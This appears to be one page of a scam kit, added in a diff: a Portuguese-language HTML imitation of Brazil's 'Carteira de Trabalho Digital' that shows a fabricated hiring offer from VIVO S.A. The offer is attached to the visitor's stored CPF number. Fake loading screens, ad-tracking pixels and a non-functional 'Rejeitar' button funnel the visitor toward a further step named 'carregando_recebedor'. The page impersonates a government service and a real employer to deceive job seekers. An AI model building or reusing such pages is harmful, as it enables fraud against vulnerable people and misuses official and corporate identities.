@@ -1,0 +1,147 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Carteira de Trabalho Digital</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <style>
+    body { font-family: 'Roboto', sans-serif; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .spin { animation: spin 1s linear infinite; }
+  </style>
+
+<script>
+  window.pixelId = "6800b134ebd4fe5c54b14d47";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){
+      n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)
+    };
+    if(!f._fbq)f._fbq=n;
+    n.push=n;
+    n.loaded=!0;
+    n.version='2.0';
+    n.queue=[];
+    t=b.createElement(e);t.async=!0;
+    t.src=v;
+    s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)
+  }(
+    window,
+    document,
+    'script',
+    'https://connect.facebook.net/en_US/fbevents.js'
+  );
+  fbq('init', '598153602790130');
+  fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=598153602790130&ev=PageView&noscript=1"
+  />
+</noscript>
+<!-- End Facebook Pixel Code -->
+</head>
+<body class="bg-white font-roboto">
+
+<!-- Tela de carregamento -->
+<div id="loginScreen" class="fixed inset-0 bg-blue-900 flex flex-col items-center justify-center text-white px-4">
+  <img src="images/unnamed-removebg-preview-1.png" alt="Logo" class="w-32 h-32 mb-6">
+  <div class="w-16 h-16 border-t-4 border-white rounded-full spin mb-4"></div>
+  <p class="text-lg mb-4 text-center">Acessando Carteira de Trabalho Digital do CPF: <span id="display-cpf">000.000.000-00</span></p>
+  <p class="text-sm text-blue-200 text-center">Aguarde enquanto consultamos os dados</p>
+</div>
+
+<!-- Conteúdo principal -->
+<div id="mainContent" class="hidden">
+  <div class="bg-blue-900 text-white p-4">
+    <div class="flex items-center mb-2">
+      <img src="images/unnamed-removebg-preview-1.png" alt="Logo" class="h-10 w-10">
+      <h1 class="ml-4 text-lg font-medium uppercase">CARTEIRA DE TRABALHO DIGITAL</h1>
+    </div>
+    <div class="text-xl font-light">VIVO S.A.</div>
+  </div>
+  <div class="flex border-b">
+    <div class="w-full text-center py-3 border-b-2 border-blue-900 text-blue-900 font-medium">PEDIDO DE CONTRATAÇÃO</div>
+  </div>
+  <div class="bg-gray-100 p-4">
+    <div class="mb-4"><div class="text-gray-500 text-sm font-medium">CNPJ</div><div class="text-gray-800">02.449.992/0001-62</div></div>
+    <div class="mb-4"><div class="text-gray-500 text-sm font-medium">Data de Contratação</div><div class="text-gray-800" id="currentDate"></div></div>
+    <div class="mb-4"><div class="text-gray-500 text-sm font-medium">Benefícios</div>
+      <div class="text-gray-800">INSS</div>
+      <div class="text-gray-800">Seguro Desemprego</div>
+      <div class="text-gray-800">Plano de Saúde</div>
+      <div class="text-gray-800">Vale Alimentação</div>
+    </div>
+    <div class="mb-4"><div class="text-gray-500 text-sm font-medium">Ocupação Inicial</div><div class="text-gray-800">4223-05 - Atendente de Suporte (Home Office)</div></div>
+    <div class="mb-4"><div class="text-gray-500 text-sm font-medium">Remuneração</div><div class="text-gray-800">R$ 1.788,60</div></div>
+    <div class="mt-6 bg-white p-4 rounded shadow-md">
+      <div class="text-gray-800 text-lg font-medium mb-4">Você autoriza a empresa VIVO S.A. a assinar sua Carteira Digital de Trabalho?</div>
+      <div class="flex justify-center space-x-4">
+        <button id="authorizeBtn" class="bg-blue-900 text-white px-6 py-2 rounded shadow hover:bg-blue-800 transition">Autorizar</button>
+        <button class="bg-white text-blue-900 px-6 py-2 rounded shadow border border-blue-900 hover:bg-gray-100 transition">Rejeitar</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Tela de sucesso -->
+<div id="successScreen" class="fixed inset-0 bg-blue-900 hidden flex flex-col items-center justify-center text-white px-4">
+  <img src="images/unnamed-removebg-preview-1.png" alt="Logo" class="w-32 h-32 mb-6">
+  <h2 class="text-2xl font-bold mb-2">Carteira de Trabalho</h2>
+  <p class="text-lg mb-8 text-center">Para finalizar a contratação, clique no botão "Continuar" abaixo.</p>
+  <a href="../carregando_recebedor" class="bg-white text-blue-900 px-8 py-3 rounded shadow-lg hover:bg-gray-100 transition">Continuar</a>
+</div>
+
+<script>
+  const loginScreen = document.getElementById('loginScreen');
+  const mainContent = document.getElementById('mainContent');
+  const successScreen = document.getElementById('successScreen');
+  const authorizeBtn = document.getElementById('authorizeBtn');
+  const displayCpf = document.getElementById('display-cpf');
+
+  function formatCPF(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+  }
+
+  function formatDate(dateStr) {
+    if (!dateStr) return null;
+    if (dateStr.includes('/')) return dateStr;
+    const parts = dateStr.split('-');
+    if (parts.length === 3) return `${parts[2]}/${parts[1]}/${parts[0]}`;
+    return dateStr;
+  }
+
+  const currentDate = new Date();
+  document.getElementById('currentDate').textContent = currentDate.toLocaleDateString('pt-BR');
+
+  const storedData = JSON.parse(localStorage.getItem('candidateData') || '{}');
+  displayCpf.textContent = formatCPF(storedData.cpf || '');
+
+  setTimeout(() => {
+    loginScreen.classList.add('hidden');
+    mainContent.classList.remove('hidden');
+  }, 2000);
+
+  authorizeBtn.addEventListener('click', () => {
+    authorizeBtn.textContent = "Processando...";
+    authorizeBtn.disabled = true;
+    setTimeout(() => {
+      mainContent.classList.add('hidden');
+      successScreen.classList.remove('hidden');
+    }, 2000);
+  });
+</script>
+</body>
+</html>
